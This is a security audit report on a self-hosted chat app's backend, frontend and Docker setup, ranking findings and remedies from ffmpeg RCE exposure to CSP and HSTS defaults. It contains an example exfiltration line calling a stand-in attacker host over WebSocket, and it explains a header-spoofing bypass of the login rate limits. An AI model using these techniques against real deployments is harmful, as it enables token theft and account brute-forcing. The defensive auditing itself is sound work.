# Microcord Security Audit

**Scope:** `backend/` + `frontend/` + Docker/compose + OpenAPI spec. Version 0.3.0.
**Posture:** For a small self-hostable app this codebase shows unusually good security discipline — JWT alg pinning, server-side logout, WS tickets, magic-byte validation, IDOR protection, bcrypt, `SecurityHeadersMiddleware`, non-root containers, per-endpoint rate limits. Solid foundation. But there are **real issues** that should be fixed before production deployment, including at least one high-severity RCE surface (ffmpeg on untrusted input) and a genuine rate-limit bypass via forged `X-Forwarded-For`.

Severity uses `Critical / High / Medium / Low / Info`. The most important items are **H-1** (ffmpeg RCE surface), **H-2** (XFF parsing), **H-3** (WS DoS), **M-1** (CSP `'unsafe-inline'`), **M-2** (HSTS preload/includeSubDomains default), and **M-3** (blocklist/rate-limit loss on restart).

---

## High

### H-1 — ffmpeg runs on untrusted user-uploaded media (RCE surface)

`backend/services/media_manager.py` hands every uploaded image/video/avatar to ffmpeg/libaom-av1:

```217:224:backend/services/media_manager.py
    async def _run_ffmpeg(self, cmd: list[str], output_path: str) -> str | None:
        logger.debug(f"Running ffmpeg: {' '.join(cmd)}")
        loop = asyncio.get_event_loop()
        try:
            proc = await loop.run_in_executor(
                None,
                lambda: subprocess.run(cmd, capture_output=True, text=True, timeout=FFMPEG_TIMEOUT_SECONDS),
            )
```

The command construction is safe (`shell=False`, args as a list, paths derived from UUIDs), so there's no argument-injection. The risk is that ffmpeg must **parse the file content**, which is attacker-controlled. Historical ffmpeg/libaom/libavformat CVEs have included heap overflows reachable purely from a crafted input file. Any such bug becomes code execution inside the container as `appuser`.

Partial mitigations already in place: 300s timeout, runs as `appuser`, extension + magic-byte validation upstream, 50 MB cap (1 MB for avatars).

Recommendations:
- Add a seccomp/AppArmor profile to the container (`security_opt: - seccomp=...` / `- no-new-privileges:true`) and drop capabilities (`cap_drop: [ALL]`).
- Add per-process resource limits (`prlimit --as=... --nproc=... --fsize=... --nofile=...`) around the ffmpeg invocation, or use `systemd-run --scope -p MemoryMax=...` inside the container.
- Consider running ffmpeg in a separate, more restricted sidecar (e.g. `jrottenberg/ffmpeg:*-alpine`) so a compromise doesn't share the app's DB/upload volume.
- Pin a known-good ffmpeg build and patch regularly.
- Harden Docker compose with `read_only: true` + `tmpfs: /tmp` on the prod service and `user: appuser` explicit.

### H-2 — `X-Forwarded-For` parsing is trivially spoofable when `TRUST_PROXY=true`

```11:24:backend/services/guard.py
def get_client_ip(scope: dict) -> str:
    if TRUST_PROXY:
        headers = {
            k.decode().lower(): v.decode()
            for k, v in scope.get("headers", [])
        }
        xff = headers.get("x-forwarded-for", "")
        if xff:
            return xff.split(",")[0].strip()
        xri = headers.get("x-real-ip", "")
        if xri:
            return xri.strip()
    client = scope.get("client")
    return client[0] if client else "unknown"
```

nginx, Caddy, Traefik, and most reverse proxies **append** to `X-Forwarded-For` rather than overwriting. That means the request becomes:

```
X-Forwarded-For: <attacker-supplied-value>, <real-client-ip>
```

The code picks index `0` (the attacker-supplied value). An attacker can set any IP they want, making the register/login rate limiters (3/hr/IP, 5/min/IP) trivially bypassable: rotate the header each request. This is a real, exploitable rate-limit bypass.

Recommendations:
- Prefer `X-Real-IP` when present (most proxies set this to the direct client and overwrite it), and/or take the rightmost-untrusted value from `X-Forwarded-For` (skip N configured trusted-proxy hops).
- Or expose a `TRUSTED_PROXY_HOPS` env var and do `xff.split(",")[-(HOPS+1)]`.
- Document that TRUST_PROXY requires the proxy to sanitize/strip inbound `X-Forwarded-For`.

### H-3 — WebSocket messages are size-checked *after* being fully received

```34:46:backend/ws/handler.py
            message = await websocket.receive()

            if message.get("type") == "websocket.disconnect":
                break

            raw = message.get("text")
            if not raw:
                continue

            if len(raw) > MAX_WEBSOCKET_MESSAGE_SIZE:
                logger.warning(f"WS message too large from {user_id}: {len(raw)} bytes")
                continue
```

`MAX_WEBSOCKET_MESSAGE_SIZE = 65536`. But uvicorn's default `--ws-max-size` is 16 MiB, so the underlying `websockets` library will happily buffer up to 16 MiB before handing the frame to the handler — and only then does this check drop it. An authenticated user can spray large frames and exhaust memory (N connections × 16 MiB). The docs even claim "WS message size limit — Inbound WebSocket messages exceeding 64 KB are dropped", which overstates what actually happens.

Recommendations:
- Pass `--ws-max-size=65536` to uvicorn in `Dockerfile.prod` (and dev Dockerfile), or configure via a uvicorn `Config` object. This causes the websockets lib to drop oversized frames at the protocol layer without buffering.
- Consider an additional per-connection message-rate limit in `ws/handler.py` (currently the only rate-limits are HTTP-side; a voice-joined user can spam signaling messages).

### H-4 — `/uploads/` is public; avatars use a predictable filename

`AUTH_EXEMPT_PREFIXES = ("/api/auth/", "/uploads/")` in `backend/services/auth.py:25-28` means **all uploads are served anonymously**. Chat image filenames are random UUIDs, so guessing them is infeasible. But:

```181:181:backend/api/upload.py
    filename = f"{user_id}{ext}"
```

Avatars are named after the user's UUID, so anyone who can fetch `/api/users` (any authenticated user) can trivially fetch every avatar, including avatars for inactive accounts. More importantly, on the public internet an attacker who learns a `user_id` can probe `/uploads/avatars/<id>.{jpg,png,avif}` without authentication at all.

Recommendations:
- Gate `/uploads/` behind `AuthMiddleware` (remove `/uploads/` from the exempt list). The frontend already has a JWT so it can fetch with the `Authorization` header; `<img>` tags don't send custom headers, so you'd need to either use short-lived signed URLs or serve via `fetch` + blob URLs. The quick alternative: accept that uploads are unauthenticated and document it explicitly.
- If keeping it public, at minimum randomize avatar filenames (include a salt/uuid suffix) so user-id enumeration doesn't reveal avatars.
- Delete "orphan" avatar files when a user updates their avatar to a different extension (`_delete_old_avatar` already does this — good).

### H-5 — `/api/auth/ws-ticket` is missing `security: [bearerAuth: []]` in the OpenAPI spec

```95:110:backend/openapi/spec.yaml
  /auth/ws-ticket:
    post:
      operationId: api.auth.ws_ticket
      summary: Issue a one-time WebSocket ticket (requires JWT auth)
      responses:
        "200":
          description: Ticket issued
```

Compare `/auth/me` and `/auth/logout` which correctly declare `security: [bearerAuth: []]`. Because the path prefix is `/api/auth/*`, `AuthMiddleware` is *also* exempt — so **the only auth enforcement is the manual `Authorization:` header check inside `api.auth.ws_ticket`** (backend/api/auth.py:105-125). That check is actually implemented, so the endpoint is not open — but this is fragile: a future refactor that forgets the manual check would silently issue WS tickets to unauthenticated clients, granting anonymous full WS access.

Recommendations:
- Add `security: [bearerAuth: []]` to `/auth/ws-ticket` so Connexion's `x-bearerInfoFunc` handles auth declaratively.
- Update the handler to only use `token_info` and fail otherwise; drop the manual-parse fallback.
- Same review for `/auth/logout` — it has `security:` in the spec but still manually parses the header instead of using `token_info`. Harmonize.

---

## Medium

### M-1 — CSP is `script-src 'self' 'unsafe-inline'` (no nonce/hash)

```13:22:backend/services/security_headers.py
    "Content-Security-Policy": (
        "default-src 'self'; "
        "script-src 'self' 'unsafe-inline'; "
        "style-src 'self' 'unsafe-inline'; "
        "img-src 'self' data: blob:; "
        "media-src 'self' blob:; "
        "connect-src 'self' ws: wss:; "
        "font-src 'self'; "
        "frame-ancestors 'none'"
    ),
```

- `'unsafe-inline'` in `script-src` defeats the main XSS defense CSP is supposed to provide. The app already relies on DOMPurify (`frontend/src/components/chat/message.jsx:41-44`), which is good, but CSP-as-defense-in-depth is gone. An attacker who sneaks past DOMPurify (DOMPurify bypasses have been found historically; clobbering via unusual markdown output is a real category) gets full JS execution.
- `connect-src 'self' ws: wss:` allows WebSocket connections to **any** host, letting an XSS-ed script exfiltrate via `new WebSocket("wss://attacker.example")`. `'self'` alone covers same-origin WebSockets in CSP level 3.
- `img-src 'self' data: blob:` + `media-src 'self' blob:` are fine but `data:` in `img-src` enables some tracking/exfiltration techniques; tolerable given DOMPurify stripping.

Recommendations:
- Drop `'unsafe-inline'` from `script-src`. The Vite build does not produce inline scripts by default — verify with a CSP-only dry run and add nonces for the one Vite module preload if needed.
- Consider `'strict-dynamic'` + nonce once you're off `'unsafe-inline'`.
- Tighten `connect-src` to just `'self'`.
- Keep `style-src 'unsafe-inline'` only if CSS-in-JS or inline `style` attributes are required; DOMPurify already blocks `style` attributes/tags (`FORBID_TAGS: ['style'], FORBID_ATTR: ['style']`).

### M-2 — HSTS default includes `preload; includeSubDomains`

```37:37:backend/services/security_headers.py
_HSTS_HEADER = {"Strict-Transport-Security": "max-age=63072000; includeSubDomains; preload"}
```

Shipping this header on a self-hosted app by default is risky:
- `includeSubDomains` means **every subdomain under the deployed apex** must serve HTTPS. If an operator hosts microcord at `chat.example.com` and uses `internal.example.com` for HTTP tooling, HSTS now breaks the tooling.
- `preload` advertises eligibility for the browser-baked preload list. It doesn't auto-submit, but tempts operators to submit at hstspreload.org — which is essentially **irreversible** and applies to the whole apex.

Recommendations:
- Default to `max-age=63072000` only (no `includeSubDomains`, no `preload`).
- Document how to opt in for operators running the app on a domain they fully control.
- Alternatively gate `includeSubDomains`/`preload` behind env vars.

### M-3 — Token-revocation blocklist and rate-limit buckets are in-memory only

`backend/services/guard.py` keeps `_revoked` and `_buckets` in a module-level dict. Server restart = clean slate. Implications:

- "Logout" after a suspected token compromise doesn't survive the next deploy/restart. A stolen token is valid until its natural `exp` (default 24 h).
- Rate-limit counters reset; an attacker who bruteforces until backoff hits and then waits for a restart bypasses the exponential cap.
- Multiple app instances behind a load balancer don't share state. Microcord is a single-process design, but this is worth documenting.

Recommendations:
- Persist revocation to SQLite (small table: `jti`, `expires_at`). On startup, load active revocations. Prune on boot and periodically.
- Consider shortening `JWT_EXPIRY_HOURS` default to 8 h or less and adding refresh tokens. 24 h for an app with no 2FA is on the longer end.

### M-4 — Token stored in `localStorage` (XSS extraction)

```13:20:frontend/src/hooks/use-user.js
export function getToken() {
  return localStorage.getItem(TOKEN_STORAGE_KEY);
}

export function authHeaders() {
  const token = getToken();
  return token ? { Authorization: `Bearer ${token}` } : {};
}
```

Any XSS (including a DOMPurify bypass via M-1) can exfiltrate the token. If CSP is hardened per M-1 this is mitigated; still, an HttpOnly cookie with `SameSite=Strict; Secure` is strictly stronger. The app already handles tickets for WS, so moving HTTP auth to cookies would not require reworking the WS flow. Not urgent if M-1 is fixed; flagging as a known tradeoff.

### M-5 — Registration passphrase logged at INFO on every boot

```45:46:backend/services/guard.py
    def log_passphrase(self) -> None:
        logger.info(f"Registration passphrase: {self.passphrase}")
```

It's a 6-hex-digit (24-bit) secret — brute-forcing online is throttled by the register rate limit (3/hr/IP, but see H-2), so offline attacks are the main risk. Logging it at INFO means it ends up in aggregated logs, `docker logs`, syslog, observability platforms, screenshots shared in chat, etc. The passphrase is also the sole barrier to account creation.

Recommendations:
- Log once at startup to stderr (not INFO), or log a redacted fingerprint plus instructions to `docker compose exec app cat /app/data/.passphrase`.
- Optionally persist the auto-generated passphrase to `data/.passphrase` (0o600) like `.jwt_secret`, and don't log its value — just log "passphrase stored at data/.passphrase".
- Bump entropy to ≥8 hex chars (32 bits) by default.

### M-6 — Registration returns `409 Username already taken` → username enumeration

```52:53:backend/api/auth.py
    if user is None:
        return ConnexionResponse(status_code=409, body={"error": "Username already taken"})
```

Combined with no email/captcha requirement and the passphrase being a shared secret that registrants must know, this isn't catastrophic — a stranger who has the passphrase is essentially already trusted. But on password reset / impersonation flows it's still the classic user-enumeration oracle.

Recommendation: use a generic "Unable to register" 409 or only disclose the conflict after successful passphrase verification (which is already the case — the passphrase is checked *before* the uniqueness check, so this is **actually fine in the current flow**: without the passphrase you can't probe usernames). Low-severity note: reorder explicitly so the passphrase check definitively gates enumeration, and add a comment.

### M-7 — `_validate_magic` has dead/misleading table entry for mp4/mov

```19:25:backend/api/upload.py
MAGIC_BYTES = {
    b"\x89PNG": {".png"},
    b"\xff\xd8\xff": {".jpg", ".jpeg"},
    b"GIF8": {".gif"},
    b"\x00\x00\x00": {".mp4", ".mov"},
    b"\x1a\x45\xdf\xa5": {".webm"},
}
```

`\x00\x00\x00` as a magic is wildly loose — it would accept any file that happens to start with three null bytes as mp4/mov if the later code path were ever reached. In practice `_validate_magic`'s early return for `.mp4/.mov` short-circuits this via the `ftyp` box check, so it's not exploitable today. It's a booby trap for the next maintainer.

Recommendation: delete the `b"\x00\x00\x00"` entry to prevent a future refactor from accidentally activating it.

### M-8 — Swagger UI exposed on production

`connexion[swagger-ui]` mounts `/api/ui/` in prod. Not strictly a vuln (endpoints are protected), but it leaks the entire API surface + schemas to anyone who hits `https://your-domain/api/ui/`. Many teams prefer to keep docs off prod.

Recommendation: either disable Swagger UI in prod builds (`connexion.AsyncApp(..., swagger_ui=False)` conditional on `MODE=production`) or gate it behind a separate auth.

### M-9 — `docker-compose.prod.yml` lacks basic container hardening

```1:20:docker-compose.prod.yml
services:
  app:
    build:
      context: .
      dockerfile: Dockerfile.prod
    ports:
      - "8000:8000"
    volumes:
      - ./data:/app/data
      - ./uploads:/app/uploads
    environment:
      ...
    restart: unless-stopped
```

Missing defense-in-depth:
- `user: appuser` is set in the image but not enforced in compose.
- No `cap_drop: [ALL]`.
- No `security_opt: [no-new-privileges:true]`.
- No `read_only: true` with a `tmpfs` for `/tmp`.
- No resource limits (`mem_limit`, `pids_limit`, `cpus`).
- Binds `8000:8000` on `0.0.0.0`. If the operator forgets a firewall, the backend is reachable directly over HTTP, bypassing the TLS proxy.

Recommendations:
```yaml
services:
  app:
    # ...
    ports:
      - "127.0.0.1:8000:8000"     # only loopback — reverse proxy handles external
    user: appuser
    cap_drop: [ALL]
    security_opt:
      - no-new-privileges:true
    read_only: true
    tmpfs:
      - /tmp
    mem_limit: 1g
    pids_limit: 256
```

### M-10 — No body-size limit for JSON endpoints

Uvicorn/Starlette does not cap request body size by default, and neither does Connexion. Upload routes have explicit size checks, but `POST /api/messages` will happily buffer a 100 MB JSON body before `content` hits the 4 000-char limit. Easy to weaponize against the event loop.

Recommendation: enforce body-size ceilings at the reverse proxy (nginx `client_max_body_size 51m` for upload routes, `200k` elsewhere) and/or add a Starlette middleware that reads `Content-Length` and rejects oversized requests before parsing.

### M-11 — `ICE_SERVERS` returned to any authenticated user

```87:88:backend/api/voice.py
async def get_voice_config() -> dict:
    return {"ice_servers": ICE_SERVERS}
```

If operators put long-lived TURN credentials in `ICE_SERVERS`, every authenticated user sees them and can use the TURN relay for unrelated traffic. This is a standard WebRTC footgun, not a bug, but worth flagging.

Recommendation: document that TURN credentials should be short-lived (time-limited HMAC creds, RFC 7635/7065). Consider generating per-user ephemeral TURN creds on the server side if you ever ship a TURN server.

---

## Low

### L-1 — WS ticket carried in URL query string
```13:16:backend/ws/handler.py
def _extract_user_id(websocket: WebSocket) -> str | None:
    ticket = websocket.query_params.get("ticket")
```
Tickets land in reverse-proxy/access logs. TTL is 30 s and single-use, so impact is bounded. Fine.

### L-2 — No per-WS-connection rate limit on signaling messages
A voice-joined user can flood `voice_signal`/`screenshare_signal`. `ws_manager.send_to` fans out to one peer, so blast radius is small, but it's a DoS vector against a targeted peer. Add a simple per-user-per-second token bucket in `ws/handler.py` if abuse becomes a concern.

### L-3 — Dockerfiles and requirements.txt not pinned by digest/hash
`FROM python:3.12-slim`, `FROM node:22-alpine`, and `pip install -r requirements.txt` (no `--require-hashes`). Supply-chain hygiene. Use digests (`python:3.12-slim@sha256:...`) and `pip-compile --generate-hashes` when you care about reproducibility.

### L-4 — `restart: unless-stopped` means unattended silent recovery
If the app crashes in an exploitable state, it restarts without operator notice. Add monitoring / log alerting.

### L-5 — `X-Frame-Options: DENY` plus `Content-Security-Policy: frame-ancestors 'none'` is redundant but not harmful
Keep both for older-browser compatibility.

### L-6 — `bcrypt.gensalt()` uses default cost factor (12)
Adequate today. Revisit if CPU cost budget allows 13–14 in 2027+.

### L-7 — `Cookie` security nits are N/A since no cookies are issued
If M-4 is implemented and you move to cookies, remember `HttpOnly; Secure; SameSite=Strict; Path=/`.

### L-8 — `Cross-Origin-Opener-Policy: same-origin` set, but no `Cross-Origin-Embedder-Policy`
If you want `crossOriginIsolated` (needed for `SharedArrayBuffer`, fine-grained timing, etc.) add `COEP: require-corp`. Not required; your WebRTC/media paths don't need it.

### L-9 — `docs/repo-guide.md` slightly out of date vs code
`backend/models/` does not exist — the code is under `backend/database/`. Minor, but per `docs/INTROSPECTION.md` the guide is supposed to track reality.

### L-10 — `get_user` / `list_users` return `name` (login username) to every authenticated user
By design (needed for @mentions etc.), but the display-name fallback (`effective_name`) intentionally masks it in the UI. Leaking both login name and display name to all logged-in users is worth being explicit about in the threat model.

### L-11 — `Dockerfile.prod` does `apt-get update && apt-get install -y ... ffmpeg`
Debian's ffmpeg tracks slowly. Consider a static ffmpeg build from a maintained upstream if you must stay close to upstream patches.

### L-12 — `CHOKIDAR_USEPOLLING=true` is a dev-only var; currently only listed in docs
Informational. No security impact.

### L-13 — JWT has `jti` but the `sub`/`name` pair means tokens survive a rename
If a user renames, the JWT's embedded `name` becomes stale; nothing critical depends on it in the middleware (only `sub` matters for identity lookups), but the WS handler uses the user-id scope. OK.

---

## Info / Positive observations

These are things the codebase **gets right** and are worth preserving:

- JWT algorithm pinned (`algorithms=[JWT_ALGORITHM]`) with `require=[sub, name, jti, exp, iat, iss, aud]`. No `alg=none` trap.
- `secrets.compare_digest` used for passphrase comparison.
- Author identity derived from JWT, never from request body (`backend/api/chat.py:68-91`).
- IDOR protection on `PATCH /users/{id}` (`backend/api/users.py:36-38`).
- Magic-byte validation and streamed upload with early abort on size overflow.
- UUID-based upload filenames for chat images prevent path traversal (`uuid.uuid4().hex + ext`).
- `_migrate_columns` only iterates SQLAlchemy metadata, not user input (no SQL injection).
- DOMPurify applied to snarkdown output, plus `FORBID_TAGS:['style']`, `FORBID_ATTR:['style']`.
- All SQL via SQLAlchemy parameterized queries.
- `.jwt_secret` written at `0o600`.
- Dockerfiles run as `appuser` (non-root).
- CORS allow-list is strict (`allow_origins=[CORS_ORIGIN]`, no wildcard, no `allow_credentials`).
- Rate limiting is per-endpoint with reasonable exponential backoff.
- WS single-sharer guarantee enforced server-side.
- Voice/screenshare signal forwarding checks both parties are in the room before relaying (`ws/handler.py:106-145`).

---

## Prioritized remediation list

Suggested order, should be doable in a single afternoon:

1. **(H-2)** Fix `get_client_ip` — prefer `X-Real-IP`, or take rightmost-untrusted from XFF; update docs.
2. **(H-3)** Add `--ws-max-size=65536` to uvicorn CMD in both Dockerfiles.
3. **(M-1)** Remove `'unsafe-inline'` from `script-src`; tighten `connect-src` to `'self'`. Verify Vite build doesn't emit inline scripts.
4. **(M-2)** Ship HSTS without `preload` / `includeSubDomains` by default; gate behind env var.
5. **(H-1)** Harden Docker compose: `user: appuser`, `cap_drop: [ALL]`, `security_opt: [no-new-privileges:true]`, `read_only: true` + tmpfs, memory/pids limits, bind port to `127.0.0.1`. (M-9)
6. **(M-3)** Persist the JTI revocation blocklist to SQLite. Optionally shorten default `JWT_EXPIRY_HOURS` to 8.
7. **(H-4)** Decide: gate `/uploads/` behind auth, or document explicitly + randomize avatar filenames.
8. **(H-5)** Add `security: [bearerAuth: []]` to `/auth/ws-ticket` (and rely on `token_info` in the handler).
9. **(M-5)** Stop logging the registration passphrase at INFO; persist to `data/.passphrase`.
10. **(M-8)** Disable Swagger UI in prod (or require auth).
11. **(M-10)** Set request body-size ceilings at the reverse proxy and/or add a middleware.
12. **(M-7)** Delete the dead `b"\x00\x00\x00": {".mp4", ".mov"}` entry from `MAGIC_BYTES`.
13. Low-severity items as time allows.

No issues discovered would block a *soft launch* to trusted users, but **H-1, H-2, H-3, M-1, M-2, and M-9 should land before any public production exposure.**
